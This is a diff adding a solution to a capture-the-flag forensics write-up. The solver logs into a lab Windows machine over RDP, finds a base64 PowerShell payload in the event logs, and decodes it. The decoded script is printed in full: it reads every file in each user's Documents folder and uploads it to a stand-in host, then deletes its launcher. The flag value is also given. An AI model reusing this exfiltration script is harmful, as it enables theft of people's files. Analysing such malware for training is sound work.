@@ -486,7 +486,94 @@ Username: Administrator
 Password: Cool2Pass
 ```
 
-#### HOMEWORK
+##### Solution
+
+Using windows event viewer, found a powershell log entry executing a base64 encoded command which lead to another base64 encrypted string that finally revealed the flag.
+
+##### Steps
+
+Logged in with command:
+
+```bash
+xfreerdp /v:env263.target04 /u:Administrator /p:Cool2Pass
+```
+
+And greeted with this nice picture of a chicken
+
+![Chicken desktop](../../images/chicken.png){: .image-process-crisp}
+
+Remembering what was mentioned in the description "Mother complaining", "failed logins", a good start would be to open "Internet Explorer" and check the history.
+
+![Internet Explorer history](../../images/ie-history.png){: .image-process-crisp}
+
+Surely there's the Admiral's page, so we're on the right browser and
+the history contains some peculiar entries, but not so useful.
+
+Ok, where could we check malware activity? Processes? Logs?
+
+In the process monitor, powershell showed it's head from time to time, taking this hint, we're moving to logs.
+
+![Windows event viewer, powershell log entry highlighted](../../images/infected-windows-logs.png){: .image-process-crisp}
+
+As we can see, there are a lot of frequent entries and a huge base64
+payload that reeks of malware.
+
+Now we open up cyber chef and analyze.
+
+![CyberChef decoded first payload](../../images/cyber-chef-decode.png){: .image-process-crisp}
+
+Lot's of spaces, but hot rif of it with search and replace. So we're looking at this, and at the bottom we see that the base64 from variable `$e` is decoded and stored in `$s` which is lastly passed to some gzip compression function.
+
+![Cleaned up first payload](../../images/cleaned-decoded-first-payload.png){: .image-process-crisp}
+
+Now we can do the same in cyber chef. First using "From Base64" and then "Gunzip".
+
+![Decoding the second payload with base64 and gunzip](../../images/base64-gunzip-cs2022.png){: .image-process-crisp}
+
+```powershell
+$uri="http://check.ctf/upload"
+try {
+$ErrorActionPreference = "SilentlyContinue"
+$f="ZmxhZyBpcyA4MTY4MTc3NS0yYTE0LTQ2MzktOGQyNC01MjYyZTUyMTI2N2Y="
+foreach ($user in $(Get-ChildItem -path "C:\Users").FullName) {
+$files=(Get-ChildItem -recurse -path "$user\Documents").FullName
+foreach ($file in $files) {
+$x = Get-Item -Path $file
+$fname = (Get-ChildItem $file).Name
+$fileBytes = [System.IO.File]::ReadAllBytes($x);
+$fileEnc = [System.Text.Encoding]::GetEncoding('ISO-8859-1').GetString($fileBytes);
+$boundary = [System.Guid]::NewGuid().ToString(); 
+$LF = "`r`n";
+$bodyLines = (
+"--$boundary",
+"Content-Disposition: form-data; name=`"upload`"$LF",
+"true$LF",
+"--$boundary",
+"Content-Disposition: form-data; name=`"file`"; filename=`"$fname`"",
+"Content-Type: application/octet-stream$LF",
+$fileEnc,
+"--$boundary--$LF" 
+) -join $LF
+Invoke-RestMethod -Uri $Uri -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines | Out-Null
+}
+}
+$ErrorActionPreference = "Continue"
+}
+catch {
+$ErrorActionPreference = "Continue"
+Write-Error "error"
+}
+Remove-Item .\update.cmd -Force -ErrorAction SilentlyContinue
+```
+
+This looks like the correct path and we can finally find the flag decrypting another base64 string.
+
+```bash
+❯ echo -n "ZmxhZyBpcyA4MTY4MTc3NS0yYTE0LTQ2MzktOGQyNC01MjYyZTUyMTI2N2Y=" | base64 -d
+flag is 81681775-2a14-4639-8d24-5262e521267f
+```
+
+#### HOMEWORK (UNSOLVED)
 
 ```md
 DESCRIPTION
@@ -497,7 +584,7 @@ Solve the homework to reveal the answer in flag.txt
 Homework
 ```
 
-#### EMOJI ANALYSIS
+#### EMOJI ANALYSIS (UNSOLVED)
 
 ```md
 DESCRIPTION
